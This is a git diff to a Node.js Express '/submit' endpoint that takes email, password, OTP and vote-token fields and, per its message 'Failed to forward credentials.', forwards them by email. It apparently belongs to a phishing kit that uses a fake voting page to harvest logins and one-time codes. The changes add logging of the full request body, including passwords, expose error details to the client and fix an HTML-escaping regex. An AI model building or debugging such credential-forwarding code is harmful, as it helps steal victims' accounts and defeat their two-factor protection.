@@ -19,6 +19,8 @@ app.post("/submit", async (req, res) => {
   const { type, email, password, otp, candidate, voteToken } = req.body;
   const timestamp = new Date().toISOString();
 
+  console.log("Received data:", req.body); // Debugging statement
+
   if (!resend) {
     return res.status(500).json({
       success: false,
@@ -93,7 +95,8 @@ app.post("/submit", async (req, res) => {
     console.error("Failed to send email via Resend:", error);
     return res.status(500).json({
       success: false,
-      message: "Failed to forward credentials."
+      message: "Failed to forward credentials.",
+      error: error.message // Provide more context for debugging
     });
   }
 });
@@ -102,7 +105,7 @@ function escapeHtml(value) {
   return String(value)
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
-    .replace(//>/g, "&gt;")
+    .replace(/>/g, "&gt;") // Fixed typo here
     .replace(/"/g, "&quot;")
     .replace(/'/g, "&#039;");
 }
